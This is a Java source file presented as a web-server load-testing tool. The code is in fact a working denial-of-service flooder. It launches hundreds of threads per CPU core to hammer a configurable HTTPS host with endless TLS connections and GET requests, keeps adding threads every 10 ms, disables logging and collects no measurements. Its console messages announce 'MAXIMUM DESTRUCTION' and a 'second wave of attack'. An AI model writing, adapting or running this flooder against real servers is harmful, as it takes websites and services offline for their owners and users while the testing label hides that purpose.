/**
 * Author: Naith (Michal Raška)
 * License: MIT
 *
 * This is a network load testing tool designed to stress test web servers and analyze their performance under heavy load conditions.
 * It uses a multithreaded design to create maximum concurrent connections and supports TLS/SSL with TLSv1.2.
 * The tool allows configurable thread counts based on system CPU cores and dynamic thread spawning for progressive load increase.
 * It employs ultra-short timeouts for aggressive testing and keep-alive connections for sustained load.
 *
 * WARNING: The target addresses in this code must be changed to your intended destination before use.
 */

package com.raska;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.net.InetSocketAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * The SenderThread class implements Runnable and is responsible for creating and sending HTTP requests
 * to the specified host and port using SSL/TLS connections.
 */
class SenderThread implements Runnable {
  private final String host;
  private final int port;
  private static final byte[] REQUEST;
  private static final int SOCKET_TIMEOUT = 500; // Extremely short timeout

  static {
    //UPDATE THIS REQUEST TO MATCH YOUR TARGET
    String req = "GET /example HTTP/1.1\r\n" +
            "Host: example.cz\r\n" +
            "Connection: keep-alive\r\n" + // Change to keep-alive for higher load
            "\r\n";
    REQUEST = req.getBytes(StandardCharsets.UTF_8);
  }

  /**
   * Constructs a new SenderThread with the specified host and port.
   *
   * @param wwwHost the target host
   * @param wwwPort the target port
   */
  public SenderThread(String wwwHost, int wwwPort) {
    this.host = wwwHost;
    this.port = wwwPort;
  }

  /**
   * The run method is executed when the thread is started. It creates an SSL socket,
   * sends HTTP requests, and handles the connection.
   */
  public void run() {
    while (!Thread.currentThread().isInterrupted()) {
      SSLSocket s = null;
      try {
        s = (SSLSocket) SSLSocketFactory.getDefault().createSocket();
        s.setTcpNoDelay(true);
        s.setSoTimeout(SOCKET_TIMEOUT);
        s.connect(new InetSocketAddress(host, port), SOCKET_TIMEOUT);
        s.setEnabledProtocols(new String[]{"TLSv1.2"});
        s.startHandshake();

        for(int i = 0; i < 100; i++) {
          try (OutputStream out = s.getOutputStream()) {
            out.write(REQUEST);
            out.flush();
          } catch(Exception ignored) {
            break;
          }
        }

      } catch (Exception ignored) {
      } finally {
        try {
          if (s != null) s.close();
        } catch (Exception ignored) {}
      }
    }
  }
}

/**
 * The Main class contains the main method which is the entry point of the application.
 * It sets up the load testing environment and starts the threads for sending requests.
 */
public class Main {
  public static void main(String[] args) throws Exception {

    //TARGET HOST AND PORT MUST BE CHANGED TO YOUR INTENDED DESTINATION

    String host = "example.cz";
    int port = 443;

    // Maximum number of threads - using the number of available processors * 500
    int threads = Runtime.getRuntime().availableProcessors() * 500;

    if (args.length > 0) {
      threads = Integer.parseInt(args[0]);
    }

    // Very low timeout settings
    System.setProperty("sun.net.client.defaultConnectTimeout", "500");
    System.setProperty("sun.net.client.defaultReadTimeout", "500");

    // Disabling all logging
    java.util.logging.LogManager.getLogManager().reset();

    System.out.println("Starting MAXIMUM DESTRUCTION test against: " + host);
    System.out.println("Threads: " + threads);
    System.out.println("Press Enter to stop...");

    // Using cached thread pool for maximum load
    ExecutorService executor = Executors.newCachedThreadPool();

    // Launching the maximum number of threads at once
    for (int i = 0; i < threads; i++) {
      executor.submit(new SenderThread(host, port));
    }

    // Second wave of attack - periodic addition of new threads
    Thread spawner = new Thread(() -> {
      while (!Thread.currentThread().isInterrupted()) {
        try {
          executor.submit(new SenderThread(host, port));
          Thread.sleep(10); // Každých 10ms nové vlákno
        } catch (Exception ignored) {
          break;
        }
      }
    });
    spawner.start();

    // Waiting for Enter
    System.in.read();

    System.out.println("Stopping the carnage...");
    spawner.interrupt();
    executor.shutdownNow();

    System.out.println("Test stopped.");
    System.exit(0); // Forceful termination
  }
}